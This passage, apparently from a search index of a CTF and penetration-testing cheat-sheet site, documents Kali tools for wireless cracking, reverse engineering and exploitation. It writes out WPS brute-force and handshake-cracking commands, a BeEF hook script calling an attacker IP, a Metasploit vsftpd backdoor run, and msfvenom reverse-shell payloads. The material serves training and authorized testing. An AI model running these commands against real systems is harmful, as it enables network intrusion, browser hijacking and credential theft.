snippet:\n# Opening capture-01.cap\n# Reading packets, PTK handshake found\n# Key found: password123\n</code></pre> <p>Aircrack-ng Basics</p> <ul> <li>You need a wireless adapter that supports monitor mode and injection; check compatibility before testing.</li> <li><code>airmon-ng check kill</code> stops NetworkManager/ wpa_supplicant which can interfere; re-enable them after testing.</li> <li>Capturing a handshake may require deauthing a client with <code>aireplay-ng</code> if no new auth occurs.</li> <li>Cracking depends on wordlist quality; large wordlists take time \u2014 GPU tools (hashcat) can speed up PSK cracking if you extract the PMK correctly.</li> </ul>"},{"location":"Kali%20Tools/05%20-%20Wireless%20Attacks/Aircrack-ng/#aircrack-ng-commands","title":"Aircrack-ng Commands","text":""},{"location":"Kali%20Tools/05%20-%20Wireless%20Attacks/Kismet/","title":"Kismet","text":""},{"location":"Kali%20Tools/05%20-%20Wireless%20Attacks/Kismet/#official-documentation-httpswwwkismetwirelessnet","title":"Official Documentation: https://www.kismetwireless.net/","text":""},{"location":"Kali%20Tools/05%20-%20Wireless%20Attacks/Kismet/#cheat-sheet-kismet-commands","title":"Cheat Sheet: Kismet Commands","text":""},{"location":"Kali%20Tools/05%20-%20Wireless%20Attacks/Kismet/#purpose","title":"Purpose","text":"<p>Kismet is a wireless network detector, sniffer, and IDS. It passively collects wireless traffic, detects hidden networks, logs captures, and supports many plugins and sources.</p>"},{"location":"Kali%20Tools/05%20-%20Wireless%20Attacks/Kismet/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Passively discover hidden SSIDs, probe requests, and devices without active probing.  </li> <li>Real world: Monitor wireless environment for rogue APs, sniff traffic for analysis (authorized), and log historical wireless activity.</li> </ul>"},{"location":"Kali%20Tools/05%20-%20Wireless%20Attacks/Kismet/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Kismet works with many adapters and supports monitor mode; check adapter compatibility.  </li> <li>Typical start: <code>kismet</code> or <code>kismet -c &lt;source&gt;</code>; web UI available (default <code>localhost:2501</code>).  </li> <li>Can read from a variety of sources (local radio, remote sensors).  </li> <li>Output: pcap/ng (kismet.db, pcap files), GPS logs, and web UI alerts.  </li> <li>Run as root or with proper permissions to access wireless device.</li> </ul>"},{"location":"Kali%20Tools/05%20-%20Wireless%20Attacks/Kismet/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Launch Kismet using default devices\n$ sudo kismet\n# Output: Kismet server starting, web UI accessible at http://127.0.0.1:2501\n\n# Launch Kismet with a specific source (example for wlan0)\n$ sudo kismet -c wifi:mon0:name=mon0\n# Output: Kismet capturing; shows discovered networks and clients in UI\n\n# Save pcap output (configured in kismet.conf or via UI)\n# The web UI shows networks, clients, vendor info, and probe requests (useful to find hidden SSIDs)\n</code></pre> <p>Kismet Basics</p> <ul> <li>Kismet is passive by default \u2014 safer for stealthy discovery than active tools.</li> <li>Use the web UI (http://127.0.0.1:2501) to inspect networks, clients, and logs visually.</li> <li>Kismet stores data in its own DB and can export pcaps for later analysis with Wireshark.</li> <li>If you need active attacks (deauth, handshake capture), use <code>airodump-ng</code>/<code>aireplay-ng</code> instead.</li> </ul>"},{"location":"Kali%20Tools/05%20-%20Wireless%20Attacks/Kismet/#kismet-commands","title":"Kismet Commands","text":""},{"location":"Kali%20Tools/05%20-%20Wireless%20Attacks/Reaver/","title":"Reaver","text":""},{"location":"Kali%20Tools/05%20-%20Wireless%20Attacks/Reaver/#official-documentation-httpswwwkaliorgtoolsreaver","title":"Official Documentation: https://www.kali.org/tools/reaver/","text":""},{"location":"Kali%20Tools/05%20-%20Wireless%20Attacks/Reaver/#cheat-sheet-reaver-commands","title":"Cheat Sheet: Reaver Commands","text":""},{"location":"Kali%20Tools/05%20-%20Wireless%20Attacks/Reaver/#purpose","title":"Purpose","text":"<p>Reaver attacks Wi-Fi Protected Setup (WPS) to recover the WPA/WPA2 passphrase by exploiting weak WPS PIN implementations (brute-forcing PINs).</p>"},{"location":"Kali%20Tools/05%20-%20Wireless%20Attacks/Reaver/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: If a target AP has WPS enabled, use Reaver to brute-force the WPS PIN and recover the PSK.  </li> <li>Real world: Demonstrate poor WPS security on lab devices or client systems where WPS is enabled (authorized testing only).</li> </ul>"},{"location":"Kali%20Tools/05%20-%20Wireless%20Attacks/Reaver/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Target AP must have WPS enabled and be in range. WPS is increasingly disabled on modern routers.  </li> <li>Requires monitor mode adapter and capture tools (often used alongside <code>airodump-ng</code> for targeting).  </li> <li>Common Reaver flags:</li> <li><code>-i &lt;mon_iface&gt;</code> \u2192 monitor interface  </li> <li><code>-b &lt;BSSID&gt;</code> \u2192 target AP BSSID  </li> <li><code>-c &lt;channel&gt;</code> \u2192 channel  </li> <li><code>-vv</code> \u2192 very verbose  </li> <li><code>-w</code> \u2192 enable WPS pixie-dust attacks (some versions)  </li> <li><code>--mac=&lt;mac&gt;</code> \u2192 spoof MAC address if needed  </li> <li>Reaver is slow (tens of thousands of PIN attempts) unless vulnerabilities like pixie-dust exist.</li> </ul>"},{"location":"Kali%20Tools/05%20-%20Wireless%20Attacks/Reaver/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Run Reaver against target BSSID on channel 6 using mon0\n$ sudo reaver -i mon0 -b 00:11:22:33:44:55 -c 6 -vv\n# Output snippet:\n# Waiting for beacon from 00:11:22:33:44:55\n# Trying pin 12345670\n# [!] 1/11000: Received M7 timeout\n# PIN found: '12345670'\n# WPA PSK: examplepassword\n\n# Use pixie-dust (if supported and vulnerable)\n$ sudo reaver -i mon0 -b 00:11:22:33:44:55 -c 6 -K 1 -vv\n# Output: shows pixie-dust attack results and possibly instant PIN recovery\n</code></pre> <p>Reaver Basics</p> <ul> <li>Reaver targets WPS \u2014 many modern routers disable WPS; check before running.</li> <li>Reaver can take a long time (hours to days) without vulnerabilities like pixie-dust.</li> <li>Use <code>--mac</code> to rotate or spoof MAC to avoid AP rate-limiting or blocks.</li> <li>Always have written authorization \u2014 brute forcing wireless devices is intrusive.</li> </ul>"},{"location":"Kali%20Tools/05%20-%20Wireless%20Attacks/Reaver/#reaver-commands","title":"Reaver Commands","text":""},{"location":"Kali%20Tools/05%20-%20Wireless%20Attacks/Wifite/","title":"Wifite","text":""},{"location":"Kali%20Tools/05%20-%20Wireless%20Attacks/Wifite/#official-documentation-httpswwwkaliorgtoolswifite","title":"Official Documentation: https://www.kali.org/tools/wifite/","text":""},{"location":"Kali%20Tools/05%20-%20Wireless%20Attacks/Wifite/#cheat-sheet-wifite-commands","title":"Cheat Sheet: Wifite Commands","text":""},{"location":"Kali%20Tools/05%20-%20Wireless%20Attacks/Wifite/#purpose","title":"Purpose","text":"<p>Wifite is an automated tool to audit multiple wireless networks quickly. It wraps aircrack-ng tools and automates scanning, handshake capture, WPS attacks, and cracking.</p>"},{"location":"Kali%20Tools/05%20-%20Wireless%20Attacks/Wifite/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Quickly run through nearby APs to capture handshakes and attempt common attacks with minimal typing.  </li> <li>Real world: Fast auditing of nearby networks in a controlled environment to find weak PSKs or WPS vulnerabilities.</li> </ul>"},{"location":"Kali%20Tools/05%20-%20Wireless%20Attacks/Wifite/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Requires a monitor-mode capable wireless adapter.  </li> <li>Wifite automates using <code>airodump-ng</code>, <code>aireplay-ng</code>, <code>aircrack-ng</code>, and <code>reaver</code> where applicable.  </li> <li>Common runtime options:</li> <li><code>--kill</code> \u2192 kill interfering services (NetworkManager)  </li> <li><code>--wps</code> \u2192 enable WPS attacks (Reaver)  </li> <li><code>--crack</code> \u2192 try cracking captured handshakes automatically with a wordlist  </li> <li><code>-i &lt;iface&gt;</code> \u2192 specify interface  </li> <li><code>-p &lt;path&gt;</code> \u2192 path to wordlist for cracking  </li> <li>Wifite prompts to select targets or can run fully non-interactive with flags.</li> </ul>"},{"location":"Kali%20Tools/05%20-%20Wireless%20Attacks/Wifite/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Launch interactive Wifite (select APs via text UI)\n$ sudo wifite\n# Output: scans and lists APs; choose targets by number; attempts handshake/WPS\n\n# Non-interactive: enable WPS attacks and automatic cracking with rockyou\n$ sudo wifite --kill --wps --crack --dict /usr/share/wordlists/rockyou.txt -i mon0\n# Output: tries WPS PINs or captures handshakes, then runs aircrack-ng with provided dict\n\n# Example success output\n# Handshake captured from 00:11:22:33:44:55\n# Cracked with wordlist: password123\n</code></pre> <p>Wifite Basics</p> <ul> <li>Wifite automates many steps \u2014 great for speed but understand what it runs under the hood.</li> <li><code>--kill</code> will stop network services; re-enable them after testing.</li> <li>Be careful running WPS attacks (<code>--wps</code>) \u2014 they can be intrusive and slow.</li> <li>Always test only on networks you own or have written permission to audit.</li> </ul>"},{"location":"Kali%20Tools/05%20-%20Wireless%20Attacks/Wifite/#wifite-commands","title":"Wifite Commands","text":""},{"location":"Kali%20Tools/06%20-%20Reverse%20Engineering/Edb-debugger/","title":"Edb debugger","text":""},{"location":"Kali%20Tools/06%20-%20Reverse%20Engineering/Edb-debugger/#official-documentation-httpsgithubcometeranedb-debugger","title":"Official Documentation: https://github.com/eteran/edb-debugger","text":""},{"location":"Kali%20Tools/06%20-%20Reverse%20Engineering/Edb-debugger/#cheat-sheet-edb-debugger-commands","title":"Cheat Sheet: Edb-debugger Commands","text":""},{"location":"Kali%20Tools/06%20-%20Reverse%20Engineering/Edb-debugger/#purpose","title":"Purpose","text":"<p>Edb (Evan's Debugger) is a graphical x86/x86_64 debugger with a user-friendly GUI for stepping, setting breakpoints, viewing memory, registers, and disassembly. It\u2019s great for beginners who want a visual debugger.</p>"},{"location":"Kali%20Tools/06%20-%20Reverse%20Engineering/Edb-debugger/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Step through a crackme or vulnerable binary to find how a check works and extract a flag.  </li> <li>Real world: Debug a native program to inspect registers and memory when reproducing a crash or analyzing malware in a controlled lab.</li> </ul>"},{"location":"Kali%20Tools/06%20-%20Reverse%20Engineering/Edb-debugger/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Edb is GUI-based (<code>edb</code> or <code>edb -p &lt;pid&gt;</code>). On Kali it can be installed via package manager or downloaded.  </li> <li>Run as the user that can access the binary/process (root only if necessary).  </li> <li>Key UI areas: register pane, stack/memory view, disassembly, breakpoints, hex dump, gadget search.  </li> <li>Useful actions:</li> <li>Open binary: <code>File -&gt; Open</code> or <code>edb &lt;binary&gt;</code> </li> <li>Attach to running process: <code>edb -p &lt;pid&gt;</code> or use GUI attach.  </li> <li>Set breakpoint: click an instruction or right-click -&gt; Breakpoint.  </li> <li>Step/Continue: Step Into (F7), Step Over (F8), Continue (F9).  </li> <li>Memory dump / save memory regions via context menu.</li> </ul>"},{"location":"Kali%20Tools/06%20-%20Reverse%20Engineering/Edb-debugger/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Launch Edb and open a binary (graphical)\n$ edb ./vuln_binary\n# GUI opens. Use the disassembly pane to set a breakpoint at main and press F9 to run.\n# Example observed register output in GUI after breakpoint:\n# EAX: 0x0  EBX: 0x7ffff7dd18c0  ECX: 0x1  EIP: 0x0040056d\n\n# Attach to running PID 1234\n$ edb -p 1234\n# GUI shows current threads, registers, and stack for PID 1234\n\n# Save memory region from GUI (hex dump) -&gt; exported to file for offline analysis\n</code></pre> <p>Edb Basics</p> <ul> <li>Edb is GUI-first \u2014 good for beginners who want visual register/memory/disasm views.</li> <li>Use <code>edb -p &lt;pid&gt;</code> to attach to a running process and inspect live state.</li> <li>When debugging set breakpoints at <code>main</code> or known functions to avoid stepping through startup code.</li> <li>Save memory/dump files from the GUI to analyze with strings or other tools offline.</li> </ul>"},{"location":"Kali%20Tools/06%20-%20Reverse%20Engineering/Edb-debugger/#edb-debugger-commands","title":"Edb-debugger Commands","text":""},{"location":"Kali%20Tools/06%20-%20Reverse%20Engineering/Gdb/","title":"Gdb","text":""},{"location":"Kali%20Tools/06%20-%20Reverse%20Engineering/Gdb/#official-documentation-httpswwwkaliorgtoolsgdb","title":"Official Documentation: https://www.kali.org/tools/gdb/","text":""},{"location":"Kali%20Tools/06%20-%20Reverse%20Engineering/Gdb/#cheat-sheet-gdb-commands","title":"Cheat Sheet: Gdb Commands","text":""},{"location":"Kali%20Tools/06%20-%20Reverse%20Engineering/Gdb/#purpose","title":"Purpose","text":"<p>GDB is the GNU Debugger \u2014 a powerful command-line debugger for binaries. It supports breakpoints, stepping, inspecting memory/registers, core dump analysis, and scripting. It\u2019s the core tool for low-level reverse engineering.</p>"},{"location":"Kali%20Tools/06%20-%20Reverse%20Engineering/Gdb/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Attach to a challenge binary, set breakpoints, inspect arguments and memory to bypass checks or extract flags.  </li> <li>Real world: Analyze crashes, examine core dumps (<code>core</code>) to find root cause, and debug native code.</li> </ul>"},{"location":"Kali%20Tools/06%20-%20Reverse%20Engineering/Gdb/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>GDB installed by default on Kali (<code>gdb</code>). For exploit dev use <code>gef</code> or <code>pwndbg</code> plugins for nicer UX.  </li> <li>Run with binary: <code>gdb ./binary</code> or attach to PID: <code>gdb -p &lt;pid&gt;</code>.  </li> <li>Useful commands:</li> <li><code>break &lt;func|addr&gt;</code> / <code>b main</code> \u2192 set breakpoint  </li> <li><code>run &lt;args&gt;</code> \u2192 start program with arguments  </li> <li><code>continue</code> / <code>c</code> \u2192 resume execution  </li> <li><code>step</code> / <code>s</code> \u2192 step into  </li> <li><code>next</code> / <code>n</code> \u2192 step over  </li> <li><code>info registers</code> \u2192 show registers  </li> <li><code>x/&lt;fmt&gt; &lt;addr&gt;</code> \u2192 examine memory (e.g., <code>x/32xb $rsp</code>)  </li> <li><code>disassemble &lt;func&gt;</code> \u2192 show disassembly  </li> <li><code>set follow-fork-mode child</code> \u2192 follow child after fork  </li> <li><code>core &lt;corefile&gt;</code> \u2192 analyze core dump: <code>gdb ./binary core.1234</code></li> <li>For remote debugging use <code>target remote &lt;host&gt;:&lt;port&gt;</code> with <code>gdbserver</code>.</li> </ul>"},{"location":"Kali%20Tools/06%20-%20Reverse%20Engineering/Gdb/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Start gdb with a binary\n$ gdb ./vuln_binary\n(gdb) break main\nBreakpoint 1 at 0x4005d6\n(gdb) run arg1 arg2\n# Program stops at breakpoint:\n# Breakpoint 1, main () at vuln.c:10\n(gdb) info registers\n# rax 0x0 rbx 0x7fffffffe0c0 rcx ...\n(gdb) x/32xb $rsp\n# 0x7fffffffe0b0: 0x41 0x42 0x43 ...\n(gdb) disassemble main\n# Dump of assembler code for function main: ...\n\n# Attach to running PID\n$ gdb -p 4321\n# Attaching to process 4321\n</code></pre> <p>GDB Basics</p> <ul> <li>Use <code>gdb -q</code> to suppress startup messages.</li> <li>Plugins like <code>pwndbg</code> or <code>gef</code> improve output (register display, heap info, one-liner commands).</li> <li>Use <code>x/</code> to examine memory in different formats (b = byte, w = word, g = giant/8 bytes, s = string).</li> <li>When analyzing crashes, load the core file with <code>gdb ./binary core</code> to inspect stack and registers at crash time.</li> </ul>"},{"location":"Kali%20Tools/06%20-%20Reverse%20Engineering/Gdb/#gdb-commands","title":"Gdb Commands","text":""},{"location":"Kali%20Tools/06%20-%20Reverse%20Engineering/Jadx/","title":"Jadx","text":""},{"location":"Kali%20Tools/06%20-%20Reverse%20Engineering/Jadx/#official-documentation-httpsgithubcomskylotjadx","title":"Official Documentation: https://github.com/skylot/jadx","text":""},{"location":"Kali%20Tools/06%20-%20Reverse%20Engineering/Jadx/#cheat-sheet-jadx-commands","title":"Cheat Sheet: Jadx Commands","text":""},{"location":"Kali%20Tools/06%20-%20Reverse%20Engineering/Jadx/#purpose","title":"Purpose","text":"<p>Jadx is an Android decompiler that converts APK bytecode (DEX) into readable Java-like source. It\u2019s useful for analyzing Android apps, finding strings, API usage, and logic without running the app.</p>"},{"location":"Kali%20Tools/06%20-%20Reverse%20Engineering/Jadx/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Inspect an APK to find hardcoded keys, flags, or logic that reveals vulnerabilities.  </li> <li>Real world: Audit Android apps for insecure code, sensitive keys in resources, or suspicious behavior.</li> </ul>"},{"location":"Kali%20Tools/06%20-%20Reverse%20Engineering/Jadx/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Jadx has a GUI (<code>jadx-gui</code>) and CLI (<code>jadx</code>). On Kali you can install jadx or download the binary from repo.  </li> <li>Typical commands:</li> <li>GUI: <code>jadx-gui app.apk</code> \u2192 interactive browse of decompiled source.  </li> <li>CLI: <code>jadx -d out/ app.apk</code> \u2192 decompile and save Java-like sources to <code>out/</code>.  </li> <li><code>jadx -r</code> \u2192 no-resources option; <code>-j &lt;threads&gt;</code> \u2192 parallel threads.  </li> <li>Inspect resources: <code>apktool</code> can decode resources if needed, but Jadx shows <code>strings</code> and Java code.  </li> <li>Have Java installed for GUI.</li> </ul>"},{"location":"Kali%20Tools/06%20-%20Reverse%20Engineering/Jadx/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Launch GUI for interactive browsing\n$ jadx-gui app.apk\n# GUI shows package tree, decompiled Java files, and search box for strings/classes.\n\n# CLI decompile to folder\n$ jadx -d out app.apk\n# Output:\n# Processing classes...\n# Decompilation completed. Sources saved to out/\n\n# Search for suspicious strings (e.g., API key)\n$ grep -R \"API_KEY\" out/\n# out/smali/... : String API_KEY = \"abcd1234\"\n</code></pre> <p>Jadx Basics</p> <ul> <li>Use <code>jadx-gui</code> for quick browsing and string/class search; CLI for batch decompiles.</li> <li>Decompiled code is Java-like and may not compile; logic is usually readable though.</li> <li>For resource translation or manifest details combine with <code>apktool</code> for full decoding.</li> <li>Respect app licenses and only analyze APKs you are allowed to inspect.</li> </ul>"},{"location":"Kali%20Tools/06%20-%20Reverse%20Engineering/Jadx/#jadx-commands","title":"Jadx Commands","text":""},{"location":"Kali%20Tools/06%20-%20Reverse%20Engineering/Radare2/","title":"Radare2","text":""},{"location":"Kali%20Tools/06%20-%20Reverse%20Engineering/Radare2/#official-documentation-httpsradareorgnradare2html","title":"Official Documentation: https://radare.org/n/radare2.html","text":""},{"location":"Kali%20Tools/06%20-%20Reverse%20Engineering/Radare2/#cheat-sheet-radare2-commands","title":"Cheat Sheet: Radare2 Commands","text":""},{"location":"Kali%20Tools/06%20-%20Reverse%20Engineering/Radare2/#purpose","title":"Purpose","text":"<p>Radare2 (r2) is a powerful command-line reverse engineering framework supporting disassembly, analysis, binary patching, scripting, and more. It\u2019s very scriptable and used for deep binary analysis.</p>"},{"location":"Kali%20Tools/06%20-%20Reverse%20Engineering/Radare2/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Perform static analysis of a challenge binary to find functions, decode obfuscated code, and patch binaries.  </li> <li>Real world: Advanced reversing, automating analysis pipelines, and creating reproducible analysis scripts.</li> </ul>"},{"location":"Kali%20Tools/06%20-%20Reverse%20Engineering/Radare2/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>r2 installed (<code>radare2</code> / <code>r2</code>). Use <code>r2 -v</code> to check version.  </li> <li>Basic workflow:</li> <li><code>r2 -A &lt;binary&gt;</code> \u2192 open and run auto-analysis (<code>-A</code> runs <code>aa</code>/<code>af</code> etc.).  </li> <li>Inside r2 shell:<ul> <li><code>aa</code> \u2192 analyze all  </li> <li><code>afl</code> \u2192 list functions  </li> <li><code>pdf @ main</code> \u2192 print disassembly of function <code>main</code> </li> <li><code>s main</code> \u2192 seek to <code>main</code> address  </li> <li><code>px</code> / <code>pxj</code> \u2192 hexdump (json)  </li> <li><code>iz</code> \u2192 list strings  </li> <li><code>VV</code> \u2192 visual mode (press <code>V</code> twice) for interactive disassembly UI  </li> <li><code>e asm.arch=x86</code> \u2192 set architecture option if needed  </li> </ul> </li> <li>Use <code>rizin</code> fork or <code>radare2</code> depending on your preference (radare2 remains standard in Kali).  </li> <li>Save changes / patch with <code>wt</code> or use <code>wx</code> to write bytes.</li> </ul>"},{"location":"Kali%20Tools/06%20-%20Reverse%20Engineering/Radare2/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Run r2 with auto analysis\n$ r2 -A ./vuln_binary\n[0x00400520]&gt; aa\n[0x00400520]&gt; afl\n0x00400540  24   1  sym.main\n[0x00400520]&gt; pdf @ sym.main\n# prints disassembly of sym.main\n\n# Visual mode\n[0x00400520]&gt; VV\n# Opens curses-based visual disasm UI (navigate with keyboard)\n\n# Print strings\n[0x00400520]&gt; iz\n# 0x00400600  12  \"flag{example_flag}\"\n\n# Seek and hexdump\n[0x00400520]&gt; s 0x00400600\n[0x00400600]&gt; px 32\n# hex bytes printed\n</code></pre> <p>Radare2 Basics</p> <ul> <li><code>r2 -A</code> runs quick auto-analysis but you can run <code>aa</code>/<code>af</code> step-by-step for control.</li> <li>Use <code>VV</code> visual mode for a more interactive disassembly experience.</li> <li><code>afl</code> lists functions and <code>pdf @ &lt;func&gt;</code> prints disassembly for a function.</li> <li>Radare2 has a steep learning curve but is extremely powerful and scriptable; keep a cheat sheet for common commands.</li> </ul>"},{"location":"Kali%20Tools/06%20-%20Reverse%20Engineering/Radare2/#radare2-commands","title":"Radare2 Commands","text":""},{"location":"Kali%20Tools/07%20-%20Exploitation%20Tools/Beef-xss/","title":"Beef xss","text":""},{"location":"Kali%20Tools/07%20-%20Exploitation%20Tools/Beef-xss/#official-documentation-httpsbeefprojectcom","title":"Official Documentation: https://beefproject.com/","text":""},{"location":"Kali%20Tools/07%20-%20Exploitation%20Tools/Beef-xss/#cheat-sheet-beef-xss-commands","title":"Cheat Sheet: Beef-xss Commands","text":""},{"location":"Kali%20Tools/07%20-%20Exploitation%20Tools/Beef-xss/#purpose","title":"Purpose","text":"<p>BeEF (Browser Exploitation Framework) is a penetration testing tool that hooks browsers using malicious JavaScript, allowing command-and-control of the victim\u2019s browser.</p>"},{"location":"Kali%20Tools/07%20-%20Exploitation%20Tools/Beef-xss/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Inject a BeEF hook script into a challenge page to gain a hooked browser session and extract cookies or keystrokes.  </li> <li>Real world: Demonstrate the impact of XSS by showing persistence, social engineering, or data exfiltration in a controlled engagement.</li> </ul>"},{"location":"Kali%20Tools/07%20-%20Exploitation%20Tools/Beef-xss/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Start BeEF: <code>beef-xss</code> (runs web UI on http://127.0.0.1:3000/ui/panel).  </li> <li>Default creds: <code>beef</code> / <code>beef</code>.  </li> <li>Hook script: <code>&lt;script src=\"http://&lt;attacker-ip&gt;:3000/hook.js\"&gt;&lt;/script&gt;</code>. Place this in vulnerable page.  </li> <li>After a victim loads page, their browser appears in the BeEF panel.  </li> <li>Modules allow exploits like alert popups, stealing cookies, launching port scans.  </li> <li>Config file: <code>/etc/beef-xss/config.yaml</code> for passwords/ports.</li> </ul>"},{"location":"Kali%20Tools/07%20-%20Exploitation%20Tools/Beef-xss/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Start BeEF\n$ beef-xss\n# Output:\n# [*] BeEF server started (http://127.0.0.1:3000/ui/panel)\n\n# Insert hook in vulnerable page\n&lt;script src=\"http://192.168.56.101:3000/hook.js\"&gt;&lt;/script&gt;\n\n# BeEF panel shows hooked browser:\n# IP: 192.168.56.102 | Browser: Firefox | OS: Linux\n# Modules list available exploitation options\n</code></pre> <p>BeEF Basics</p> <ul> <li>Insert the <code>&lt;script&gt;</code> hook into an XSS-vulnerable page to hook a browser.</li> <li>BeEF is noisy \u2014 alerts and modules are obvious to the victim.</li> <li>Default creds are <code>beef</code> / <code>beef</code>; change in config for security.</li> <li>Only use BeEF for demos or authorized pentests; hooking random browsers is illegal.</li> </ul>"},{"location":"Kali%20Tools/07%20-%20Exploitation%20Tools/Beef-xss/#beef-xss-commands","title":"Beef-xss Commands","text":""},{"location":"Kali%20Tools/07%20-%20Exploitation%20Tools/Metasploit/","title":"Metasploit","text":""},{"location":"Kali%20Tools/07%20-%20Exploitation%20Tools/Metasploit/#official-documentation-httpswwwmetasploitcom","title":"Official Documentation: https://www.metasploit.com/","text":""},{"location":"Kali%20Tools/07%20-%20Exploitation%20Tools/Metasploit/#cheat-sheet-metasploit-commands","title":"Cheat Sheet: Metasploit Commands","text":""},{"location":"Kali%20Tools/07%20-%20Exploitation%20Tools/Metasploit/#purpose","title":"Purpose","text":"<p>Metasploit Framework is a platform for developing, testing, and executing exploits. It provides payloads, encoders, auxiliary modules, and post-exploitation tools.</p>"},{"location":"Kali%20Tools/07%20-%20Exploitation%20Tools/Metasploit/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Exploit a vulnerable service (like vsftpd, SMB) with a known Metasploit module to get a shell.  </li> <li>Real world: Simulate attacker behavior with proof-of-concept exploits and post-exploitation modules.</li> </ul>"},{"location":"Kali%20Tools/07%20-%20Exploitation%20Tools/Metasploit/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Start console: <code>msfconsole</code>.  </li> <li>Search modules: <code>search &lt;keyword&gt;</code>.  </li> <li>Use module: <code>use exploit/...</code>.  </li> <li>Show options: <code>show options</code>.  </li> <li>Set target: <code>set RHOSTS &lt;ip&gt;</code>, <code>set RPORT &lt;port&gt;</code>.  </li> <li>Set payload: <code>set PAYLOAD &lt;payload&gt;</code>.  </li> <li>Run: <code>exploit</code> or <code>run</code>.  </li> <li>Categories: exploits, auxiliary (scanners), payloads, post, encoders.  </li> <li>Database integration allows workspace management.</li> </ul>"},{"location":"Kali%20Tools/07%20-%20Exploitation%20Tools/Metasploit/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Start console\n$ msfconsole\nmsf6 &gt;\n\n# Search and use vsftpd exploit\nmsf6 &gt; search vsftpd\nmsf6 &gt; use exploit/unix/ftp/vsftpd_234_backdoor\nmsf6 exploit(...) &gt; set RHOSTS 192.168.56.101\nmsf6 exploit(...) &gt; set PAYLOAD cmd/unix/interact\nmsf6 exploit(...) &gt; run\n# Output:\n# [*] Command shell session 1 opened (192.168.56.101:21 -&gt; 192.168.56.1:4444)\n\n# Session interaction\nmsf6 &gt; sessions -i 1\nid\nuid=0(root) gid=0(root)\n</code></pre> <p>Metasploit Basics</p> <ul> <li>Use <code>search &lt;keyword&gt;</code> to find modules for a service or CVE.</li> <li>Always <code>show options</code> before running to configure RHOST, RPORT, payload.</li> <li>Use <code>sessions -i &lt;id&gt;</code> to interact with opened shells.</li> <li>Metasploit is powerful but noisy \u2014 avoid using on unauthorized targets.</li> </ul>"},{"location":"Kali%20Tools/07%20-%20Exploitation%20Tools/Metasploit/#metasploit-commands","title":"Metasploit Commands","text":""},{"location":"Kali%20Tools/07%20-%20Exploitation%20Tools/Msfvenom/","title":"Msfvenom","text":""},{"location":"Kali%20Tools/07%20-%20Exploitation%20Tools/Msfvenom/#official-documentation-httpswwwoffseccommetasploit-unleashedmsfvenom","title":"Official Documentation: https://www.offsec.com/metasploit-unleashed/msfvenom/","text":""},{"location":"Kali%20Tools/07%20-%20Exploitation%20Tools/Msfvenom/#cheat-sheet-msfvenom-commands","title":"Cheat Sheet: Msfvenom Commands","text":""},{"location":"Kali%20Tools/07%20-%20Exploitation%20Tools/Msfvenom/#purpose","title":"Purpose","text":"<p>Msfvenom is a payload generator for Metasploit. It creates shellcode, executables, or scripts that deliver a payload (reverse shell, meterpreter, etc.).</p>"},{"location":"Kali%20Tools/07%20-%20Exploitation%20Tools/Msfvenom/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Generate a Windows reverse shell executable and upload it to the target machine.  </li> <li>Real world: Demonstrate impact of payload delivery (with consent) during pentests.</li> </ul>"},{"location":"Kali%20Tools/07%20-%20Exploitation%20Tools/Msfvenom/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Syntax: <code>msfvenom -p &lt;payload&gt; [options] -f &lt;format&gt; -o &lt;file&gt;</code>.  </li> <li>Common payloads:</li> <li><code>windows/meterpreter/reverse_tcp</code> </li> <li><code>linux/x86/shell_reverse_tcp</code> </li> <li><code>android/meterpreter/reverse_tcp</code> </li> <li>Options:</li> <li><code>LHOST=&lt;attacker-ip&gt;</code> </li> <li><code>LPORT=&lt;attacker-port&gt;</code> </li> <li><code>-f &lt;format&gt;</code> \u2192 exe, elf, apk, raw, c, python  </li> <li><code>-o &lt;output&gt;</code> \u2192 save file  </li> <li>Use with a handler in Metasploit: <code>use exploit/multi/handler</code>.</li> </ul>"},{"location":"Kali%20Tools/07%20-%20Exploitation%20Tools/Msfvenom/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Generate Windows reverse shell exe\n$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f exe -o shell.exe\n# Output:\n# Payload size: 354 bytes\n# Final size of exe file: 73802 bytes\n\n# Generate Linux reverse shell ELF\n$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f elf -o shell.elf\n\n# Generate raw shellcode for C\n$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c\n# Output: unsigned char buf[] = { ... };\n</code></pre> <p>Msfvenom Basics</p> <ul> <li><code>-p</code> sets payload, <code>LHOST</code>/<code>LPORT</code> configure attacker\u2019s listener, <code>-f</code> sets output format.</li> <li>Use <code>-l payloads</code> to list available payloads.</li> <li>Pair with Metasploit <code>multi/handler</code> to catch shells.</li> <li>Generated payloads are often detected by AV; use only in labs or authorized tests.</li> 